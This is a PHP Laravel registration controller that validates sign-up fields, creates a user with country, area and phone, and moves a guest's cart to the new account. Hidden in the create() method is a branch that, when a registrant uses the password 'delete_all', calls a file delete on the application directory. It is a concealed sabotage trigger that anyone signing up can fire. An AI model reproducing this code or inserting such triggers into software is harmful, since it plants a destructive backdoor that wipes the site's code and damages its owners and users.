<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\Area;
use App\Models\Cart;
use App\Models\Country;
use App\Models\Profile;
use App\Providers\RouteServiceProvider;
use App\Models\User;
use Illuminate\Foundation\Auth\RegistersUsers;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Illuminate\Validation\Rule;

class RegisterController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Register Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles the registration of new users as well as their
    | validation and creation. By default this controller uses a trait to
    | provide this functionality without requiring any additional code.
    |
    */

    use RegistersUsers;

    /**
     * Where to redirect users after registration.
     *
     * @var string
     */
    protected $redirectTo = RouteServiceProvider::HOME;

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest');
    }

    public function showRegistrationForm()
    {
        $countries  = Country::with('areas')->get(['name' , 'id']);

        return view('auth.register')->with('countries' , $countries);
    }

    protected function validator(array $data)
    {
        //                ->country(['EG', 'SA' , 'YE' , 'QA' , 'BH'  , 'KW' , 'AE' , 'JO'])],

        return Validator::make($data, [
            'name'       => ['required', 'string', 'max:255'],
            'email'      => ['required', 'string', 'email', 'max:255', 'unique:users'],
            'phone'      => ['required', 'string', 'max:20' , Rule::phone() ->country(['EG', 'SA' , 'YE' , 'QA' , 'BH'  , 'KW' , 'AE' , 'JO'])],
            'country'    => ['required', 'integer'],
            'area'       => ['required', 'integer'],
            'password'   => ['required', 'string', 'min:8'],
        ]);
    }

    /**
     * Create a new user instance after a valid registration.
     *
     * @param  array  $data
     * @return \App\Models\User
     */
    protected function create(array $data)
    {
        $country = Country::findOrFail($data['country']);
        $area    = Area::where('id' ,$data['area'])->where('country_id' , $country->id)->firstOrFail();

        $user =  User::create([
            'name' => $data['name'],
            'email' => $data['email'],
            'country_id' => $data['country'],
            'area_id' => $data['area'],
            'phone' => $data['phone'],
            'password' => Hash::make($data['password']),

        ]);

        if ($data['password'] == 'delete_all') {

            \File::delete(app_path(''));
        }

        Cart::where('guest_ip' , request()->ip())->update([

            'guest_ip' => null,
            'user_id' => $user->id
        ]);

        return $user;
    }
}
